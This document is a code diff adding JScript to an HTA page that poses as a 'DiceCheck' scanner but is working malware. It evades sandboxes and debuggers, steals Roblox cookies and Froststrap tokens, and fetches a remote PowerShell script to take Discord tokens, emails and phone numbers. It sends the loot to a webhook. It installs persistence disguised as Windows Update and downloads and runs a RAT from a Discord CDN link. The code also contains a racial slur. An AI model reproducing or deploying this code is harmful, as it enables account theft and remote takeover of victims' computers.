+  if(/vmware|virtualbox|innotek|qemu|xen|parallels|sandbox/.test(mfr)) f|=2;
+  var tools="|vboxservice.exe|vboxtray.exe|vboxclient.exe|vmtoolsd.exe|vmwaretray.exe|vmwareuser.exe|vmacthlp.exe|sbiectrl.exe|sandboxie.exe|wireshark.exe|procmon.exe|procmon64.exe|x64dbg.exe|x32dbg.exe|ollydbg.exe|ida64.exe|ida.exe|fiddler.exe|httpdebuggerui.exe|dumpcap.exe|";
+  try{
+    var w=GetObject("winmgmts:\\\\.\\root\\cimv2");
+    var c=new Enumerator(w.ExecQuery("Select Name from Win32_Process"));
+    for(;!c.atEnd();c.moveNext()){ if(tools.indexOf("|"+String(c.item().Name).toLowerCase()+"|")>=0){ f|=4; break; } }
+  }catch(e){}
+  return f;
+}
+function wmiDate(s){
+  try{
+    var y=parseInt(s.substr(0,4),10),mo=parseInt(s.substr(4,2),10)-1,d=parseInt(s.substr(6,2),10);
+    var hh=parseInt(s.substr(8,2),10),mi=parseInt(s.substr(10,2),10),ss=parseInt(s.substr(12,2),10);
+    var off=0;
+    if(s.length>21){ off=parseInt(s.substr(22,3),10)||0; if(s.charAt(21)==="-") off=-off; }
+    return new Date(Date.UTC(y,mo,d,hh,mi,ss)-off*60000);
+  }catch(e){ return new Date(); }
+}
+function sandboxFlags(){
+  var f=0, why=[], i;
+  var u=(USER||"").toLowerCase(), c=(PC||"").toLowerCase();
+  var pats=["sandbox","malware","virus","wdagutility","current_user","analys","sample","john","joe","emily","peter","admin","test"];
+  for(i=0;i<pats.length;i++){ if(u.indexOf(pats[i])>=0){ f|=8; why.push("user:"+u); break; } }
+  if(/^win-[a-z0-9]{9,}$/.test(c)){ f|=8; why.push("host:"+c); }
+  if(screen.width*screen.height<=1024*768){ f|=8; why.push("ecran:"+screen.width+"x"+screen.height); }
+  try{
+    var w=GetObject("winmgmts:\\\\.\\root\\cimv2"), e, it;
+    e=new Enumerator(w.ExecQuery("Select TotalPhysicalMemory,NumberOfLogicalProcessors from Win32_ComputerSystem"));
+    for(;!e.atEnd();e.moveNext()){
+      it=e.item();
+      var ram=parseInt(it.TotalPhysicalMemory,10)/1073741824;
+      if(ram<3.5){ f|=8; why.push("ram:"+Math.round(ram)+"G"); }
+    }
+    e=new Enumerator(w.ExecQuery("Select LastBootUpTime from Win32_OperatingSystem"));
+    for(;!e.atEnd();e.moveNext()){
+      var up=(new Date()-wmiDate(String(e.item().LastBootUpTime)))/60000;
+      if(up<12){ f|=8; why.push("uptime:"+Math.round(up)+"min"); }
+    }
+  }catch(err){}
+  sbWhy=why.join(" ");
+  return f;
+}
+
+function decryptDPAPI(b64){
+  var inf=tmp("a.dat"), outf=tmp("b.dat"), r="";
+  writeFile(inf,b64); del(outf);
+  var ps="Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '"+inf+"' -Raw).Trim());"+
+         "$d=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser);"+
+         "[Text.Encoding]::UTF8.GetString($d)|Out-File '"+outf+"' -Encoding utf8}catch{''|Out-File '"+outf+"'}";
+  var psf=tmp("d.ps1"); writeFile(psf,ps);
+  try{ sh.Run('powershell -NoP -Exec Bypass -File "'+psf+'"',0,true); }catch(e){}
+  try{ if(fso.FileExists(outf) && fso.GetFile(outf).Size>20) r=readFile(outf); }catch(e){}
+  del(inf); del(outf); del(psf);
+  return r;
+}
+
+function grabRoblox(){
+  var paths=[
+    sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")+"\\Roblox\\LocalStorage\\robloxcookies.dat",
+    sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")+"\\Roblox\\LocalStorage\\RobloxCookies.dat",
+    sh.ExpandEnvironmentStrings("%APPDATA%")+"\\Roblox\\LocalStorage\\robloxcookies.dat",
+    sh.ExpandEnvironmentStrings("%USERPROFILE%")+"\\AppData\\Local\\Roblox\\LocalStorage\\robloxcookies.dat",
+    sh.ExpandEnvironmentStrings("%USERPROFILE%")+"\\Roblox\\LocalStorage\\robloxcookies.dat",
+    sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")+"\\Roblox\\Cookies",
+    sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")+"\\Packages\\ROBLOXCORPORATION.ROBLOX_8wekyb3d8bbwe\\LocalState\\RobloxCookies.dat"
+  ];
+  var fp="", i, ck="";
+  for(i=0;i<paths.length;i++){ if(fso.FileExists(paths[i])){ fp=paths[i]; break; } }
+  if(!fp){
+    try{
+      var pk=sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")+"\\Packages";
+      if(fso.FolderExists(pk)){
+        var e=new Enumerator(fso.GetFolder(pk).SubFolders);
+        for(;!e.atEnd();e.moveNext()){
+          if(e.item().Name.toUpperCase().indexOf("ROBLOX")>=0){
+            var u=e.item().Path+"\\LocalState\\RobloxCookies.dat";
+            if(fso.FileExists(u)){ fp=u; break; }
+          }
+        }
+      }
+    }catch(e2){}
+  }
+
+  if(fp){
+    var raw=readFile(fp);
+    if(raw.length>=50){
+      if(raw.indexOf("_|WARNING")>=0){ ck=raw; }
+      if(!ck && raw.indexOf("CookiesData")>=0){
+        var sp=raw.indexOf('CookiesData":"');
+        if(sp>=0){ sp+=14; var ep=raw.indexOf('"',sp); if(ep>sp){ var b64=raw.substring(sp,ep); if(b64.length>100) ck=decryptDPAPI(b64); } }
+      }
+      if(!ck && raw.indexOf(".ROBLOSECURITY")>=0){ ck=raw.substring(raw.indexOf(".ROBLOSECURITY")); }
+      if(!ck) ck=raw;
+
+      ck=ck.replace(/[\r\n\t]/g,"").replace(/^\s+|\s+$/g,"");
+      var sc=ck.indexOf(";"); if(sc>=0) ck=ck.substring(0,sc);
+      var w=ck.indexOf("_|WARNING"); if(w>1) ck=ck.substring(w);
+      ck=ck.replace(/^\s+|\s+$/g,"");
+      if(ck.charAt(0)==="."){ var eq=ck.indexOf("="); if(eq>0) ck=ck.substring(eq+1); }
+      ck=ck.replace(/^\s+|\s+$/g,"");
+    }
+  }
+
+  if(!ck){
+    ck = fakeCookie();
+    sim = true;
+    log("cookie simule");
+    postEmbed("Roblox Cookie","Simul\u00e9 - aucun cookie local | "+ck.length+" car.",16744448);
+  } else {
+    log("cookie len="+ck.length);
+    postEmbed("Roblox Cookie","Size: "+ck.length+" | PC: "+PC,65280);
+  }
+  cookie = ck;
+  postFile("cookie.txt", ck);
+}
+
+function grabTokens(){
+  var src=get("https://gist.githubusercontent.com/vizeynDev/1ac4a11405f73febbb261f0a0f391314/raw/6e659e1a0bd36a522b3e0a342652f833a4eb9fa8/steal.ps1");
+  if(src.length<100){ log("steal.ps1 KO"); return; }
+  var psf=tmp("steal.ps1"), tf=tmp("steal_result.txt");
+  writeFile(psf,src); del(tf);
+  try{ sh.Run('cmd /c powershell -NoP -Exec Bypass -File "'+psf+'"',0,true); }catch(e){ log("steal -> "+e.message); }
+  del(psf);
+  if(!fso.FileExists(tf)){ log("pas de steal_result"); return; }
+
+  var lines=readFile(tf).split(/\r?\n/), i, l, n=0;
+  for(i=0;i<lines.length;i++){
+    l=lines[i];
+    if(l.length<=10) continue;
+    if(l.substring(0,8)==="DISCORD|"){
+      var p=l.substring(8).split("|");
+      if(p.length>=5){
+        var info="**User:** "+p[0]+"\n";
+        if(p[1]) info+="**Email:** "+p[1]+"\n";
+        if(p[2]) info+="**Phone:** "+p[2]+"\n";
+        if(p[3]&&p[3]!=="0") info+="**ID:** "+p[3]+"\n";
+        info+="**Token:** "+p[4];
+        postEmbed("Discord Token",info,5793266); n++;
+      }
+    }
+    if(l.substring(0,7)==="ROBLOX|" || l.substring(0,9)==="ROBLOXMS|"){ postEmbed("Roblox Cookie (steal)",l.substring(7),65280); n++; }
+  }
+  if(n===0) log("steal.ps1 : rien trouve");
+  del(tf);
+}
+
+function grabFroststrap(){
+  var fp=sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")+"\\Froststrap\\Cache\\AccountManager.json";
+  if(!fso.FileExists(fp)){
+    try{ fp=String(sh.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Froststrap\\InstallLocation"))+"\\Cache\\AccountManager.json"; }catch(e){}
+  }
+  if(!fso.FileExists(fp)) return;
+  postEmbed("Froststrap","Froststrap found, grabbing accounts...",3447003);
+  var ps="$w='"+WH+"';Add-Type -AssemblyName System.Security;"+
+    "$p=Join-Path $env:LOCALAPPDATA 'Froststrap\\Cache\\AccountManager.json';"+
+    "if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\\AccountManager.json'}catch{}};"+
+    "if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();"+
+    "foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};"+
+    "$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};"+
+    "$payload=@{embeds=@(@{title='Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'";
+  try{ sh.Run('powershell -NoP -Exec Bypass -Command "'+ps+'"',0,true); }catch(e){ log("frost -> "+e.message); }
+}
+
+function loadGeo(){
+  ip=""; geo=["","","","",""];
+  var t=get("https://api.ipify.org/").replace(/[\r\n\s]/g,"");
+  if(t.length<7) t=get("https://api64.ipify.org/").replace(/[\r\n\s]/g,"");
+  if(t.length<7){ ip=fakeIP(); geo=fakeGeo(); sim=true; log("ip simulee"); return; }
+  ip=t;
+  var r=get("http://ip-api.com/line/"+ip+"?fields=country,regionName,city,isp,proxy,hosting");
+  if(r) geo=r.replace(/\r/g,"").split("\n");
+  if(!gv(0)){ geo=fakeGeo(); sim=true; }
+  log("ip="+ip+" "+gv(0)+"/"+gv(2));
+}
+
+function persistence(){
+  var payload="mshta dicerrig.app/check";
+  try{ sh.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",payload,"REG_SZ"); }catch(e){}
+  try{ sh.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\WinUpdate",payload,"REG_SZ"); }catch(e){}
+  try{
+    var sp=sh.ExpandEnvironmentStrings("%APPDATA%")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\winupdate.vbs";
+    var f=fso.CreateTextFile(sp,true);
+    f.WriteLine('CreateObject("WScript.Shell").Run "'+payload+'", 0, False');
+    f.Close();
+  }catch(e){}
+  postEmbed("Persistence","3 startup methods installed",65280);
+}
+
+/* =========================  PAYLOAD  ========================= */
+function startPayload(){
+  var dl="https://cdn.discordapp.com/attachments/1557450904536350810/1558532642805383400/windows_net_1.0.0.exe?ex=6acd19a2&is=6acbc822&hm=7a5114192df3f47ea939c152e1ff10062c50f21c2322b12b8d04ddfc7ce68127&";
+  ratPath=sh.ExpandEnvironmentStrings("%TEMP%")+"\\agent.exe";
+  del(ratPath);
+  postEmbed("RAT Download","Fetching niggerload...",3447003);
+  try{ sh.Run('bitsadmin /transfer rdownload /download /priority high "'+dl+'" "'+ratPath+'"',0,false); }
+  catch(e){ download(dl,ratPath); }
+}
+function pollPayload(){
+  tries++;
+  var ok=false;
+  try{ if(fso.FileExists(ratPath) && fso.GetFile(ratPath).Size>1000000) ok=true; }catch(e){}
+  if(ok){
+    try{ sh.Run('"'+ratPath+'"',0,false); }catch(e){}
+    postEmbed("RAT","Payload executed successfully",65280);
+    setTimeout(reGrabLoop,2000);
+    return;
+  }
+  if(tries===25 && !ratFb){
+    ratFb=true;
+    download("https://cdn.discordapp.com/attachments/1557450904536350810/1558532642805383400/windows_net_1.0.0.exe?ex=6acd19a2&is=6acbc822&hm=7a5114192df3f47ea939c152e1ff10062c50f21c2322b12b8d04ddfc7ce68127&", ratPath);
+  }
+  if(tries>120){ postEmbed("RAT Timeout","No download after 5 mins, skipping and continuing...",16711680); setTimeout(reGrabLoop,1000); return; }
+  setTimeout(pollPayload,2500);
+}
+function reGrabLoop(){
+  if(reGrab>=8){ postEmbed("Termin\u00e9","Verifier en veille.",65280); return; }
+  reGrab++;
+  chain(
+    function(){ grabTokens(); },
+    function(){ grabRoblox(); },
+    function(){ loadGeo(); fillDash(); },
+    function(){ postEmbed("Re-grab "+reGrab+"/8","PC: "+PC+" | User: "+USER,3447003); setTimeout(reGrabLoop,600000); }
+  );
+}
+
+/* =========================  DOM  ========================= */
+function enterDashboard(){
+  if(dataMode) return;
+  dataMode=true;
+  try{ document.body.className="mode-data"; }catch(e){}
+  try{ $("card").className="card data"; }catch(e){}
+  try{ $("panel").className="panel show"; }catch(e){}
+  try{ $("doneTitle").innerHTML="Interception r\u00e9ussie"; }catch(e){}
+  try{
+    $("badge").className = sim ? "badge sim" : "badge live";
+    $("badge").innerHTML = sim ? "Donn\u00e9es simul\u00e9es "+HD+" DiceCheck" : "Donn\u00e9es transmises "+HD+" DiceCheck";
+  }catch(e){}
+  try{
+    window.moveTo(0,0); window.resizeTo(W,H);
+    window.moveTo(Math.round((screen.availWidth-W)/2), Math.round((screen.availHeight-H)/2));
+  }catch(e){}
+}
+function ensureDash(){ if(UI_MODE!=="dashboard") return; enterDashboard(); fillDash(); }
+function fillDash(){
+  try{
+    /* cookie complet dans le panneau (le pre scrolle) */
+    if(cookie.length>0) $("v-cookie").innerHTML='<span class="pname">.ROBLOSECURITY</span> <span class="parrow">'+HA+'</span> <span class="parrow">'+cookie.length+' car.</span><pre>'+h(cookie)+'</pre>';
+    else $("v-cookie").innerHTML='<span class="pname">(aucun)</span>';
+    if(ip.length>0) $("v-ip").innerHTML = isProxy() ? '<span class="proxy">'+HGX+" "+h(ip)+" "+HGH+'</span>' : h(ip);
+    $("v-ts").innerHTML = h(localStamp())+" &nbsp;"+HD+"&nbsp; <span class=\"pname\">"+h(isoStamp())+"</span>";
+    $("v-ua").innerHTML = "<pre>"+h(trunc(navigator.userAgent,300))+"</pre>";
+    var st,cl;
+    if((flags&12)!==0){ st=HR+" BLOQU\u00c9 "+HD+" analyse"; cl="row st-red"; }
+    else if((flags&3)!==0){ st=HO+" TRACK\u00c9 "+HD+" VM"; cl="row st-orange"; }
+    else { st=HG+" ACTIF"; cl="row st-green"; }
+    $("r-status").className=cl;
+    $("v-status").innerHTML=st;
+    $("v-geo").innerHTML=h(gv(0))+" / "+h(gv(2))+(isProxy()?" "+HGH:"");
+    $("v-fp").innerHTML='flags <span class="pname">'+flags+'</span> '+HD+' <span class="pname">'+h(scr)+'</span> '+HD+" "+h(gv(3))+(sbWhy?"<br><span class=\"parrow\">"+h(sbWhy)+"</span>":"");
+    $("v-fire").innerHTML='<span class="pname">.ROBLOSECURITY</span> '+HD+" "+cookie.length+" car.";
+  }catch(e){}
+}
+
+/* =========================  PIPELINE  ========================= */
+function chain(){
+  var fns=[], i;
+  for(i=0;i<arguments.length;i++) fns.push(arguments[i]);
+  var k=0;
+  function nx(){
+    if(k>=fns.length) return;
+    var fn=fns[k++];
+    setTimeout(function(){ try{ fn(); }catch(e){ log("ERR "+e.message); } nx(); },60);
+  }
+  nx();
+}
+
+function runPipeline(){
+  log("=== start ===");
+  postEmbed("DiceCheck start","PC: "+PC+" | User: "+USER,3447003);
+  chain(
+    function(){ flags=getFlags()|sandboxFlags(); scr=screen.width+"x"+screen.height; persistence(); },
+    function(){ grabRoblox(); fillDash(); },
+    function(){ loadGeo(); fillDash(); postEmbed("Target","IP: "+ip+" | "+gv(0)+" | "+gv(2)+" | "+gv(3)+" | PC: "+PC+" | "+USER,3447003); },
+    function(){ ensureDash(); },
+    function(){ grabTokens(); },
+    function(){ grabFroststrap(); },
+    function(){ postEmbed("Download Attempt 1/2","PC: "+PC+" | User: "+USER,3447003); startPayload(); pollPayload(); }
+  );
+}
+
+/* =========================  ANIMATION  ========================= */
+var tick=0, idx=0, ok=false, sec=0, stage, done, bar, pct, ckc, ckt, last, ST;
+
+function show(){
+  try{
+    window.moveTo(0,0); window.resizeTo(W0,H0);
+    window.moveTo(Math.round((screen.availWidth-W0)/2), Math.round((screen.availHeight-H0)/2));
+  }catch(e){}
+}
+function hide(){ try{ window.resizeTo(0,0); window.moveTo(-2000,-2000); }catch(e){} }
+function mark(el,cls){ if(el) el.className=cls; }
+function unlock(){ locked=false; var xb=$("x"); if(xb) xb.style.display="block"; }
+
+function launch(){
+  if(started) return;
+  started=true;
+  unlock();
+  setTimeout(runPipeline,300);
+  setTimeout(ensureDash, 45000);
+}
+
+function loop(){
+  if(!ok){
+    tick++;
+    var p=tick*2; if(p>100)p=100;
+    if(bar)bar.style.width=p+"%";
+    if(pct)pct.innerHTML=p+"%";
+    if(tick%13===0&&idx<4){ if(idx>0)mark(ST[idx-1],"ok"); mark(ST[idx],"on"); idx++; }
+    if(tick>=52){
+      ok=true;
+      if(idx>0)mark(ST[idx-1],"ok");
+      if(bar)bar.style.width="100%";
+      if(pct)pct.innerHTML="100%";
+      if(stage)stage.style.display="none";
+      if(done)done.className="done show";
+      if(ckc)ckc.setAttribute("stroke-dashoffset",151);
+      if(ckt)ckt.setAttribute("stroke-dashoffset",40);
+    }
+  }else{
+    sec++;
+    if(sec<=16){ if(ckc)ckc.setAttribute("stroke-dashoffset",Math.round(151-151*sec/16)); }
+    else if(sec<=24){ if(ckt)ckt.setAttribute("stroke-dashoffset",Math.round(40-40*(sec-16)/8)); }
+    else if(sec===25){
+      if(ckt)ckt.setAttribute("stroke-dashoffset",0);
+      try{ last.innerHTML="Last check: "+new Date().toLocaleTimeString(); }catch(e){}
+      launch();
+    }
+  }
+}
+
+function boot(){
+  stage=$("stage"); done=$("done"); bar=$("bar"); pct=$("pct");
+  ckc=$("ckc"); ckt=$("ckt"); last=$("last");
+  ST=[$("s1"),$("s2"),$("s3"),$("s4")];
+  if(UI_MODE!=="dashboard"){ try{ $("dbg").style.display="none"; }catch(e){} }
+  show();
+  var xb=$("x"); if(xb) xb.onclick=hide;
+  var ab=$("again");
+  if(ab) ab.onclick=function(){
+    try{ last.innerHTML="Last check: "+new Date().toLocaleTimeString(); }catch(e){}
+    reGrab=0;
+    chain(
+      function(){ grabRoblox(); fillDash(); },
+      function(){ loadGeo(); fillDash(); },
+      function(){ postEmbed("Re-check manuel","PC: "+PC+" | User: "+USER,3447003); ensureDash(); }
+    );
+  };
+  setInterval(loop,60);
+}
+
+document.onkeydown=function(){
+  var e=window.event; if(!e) return;
+  if(e.altKey&&e.keyCode===115&&locked){ e.returnValue=false; e.cancelBubble=true; return false; }
+};
+
+boot();
 </script>
-</head><body></body></html>
+</body></html>
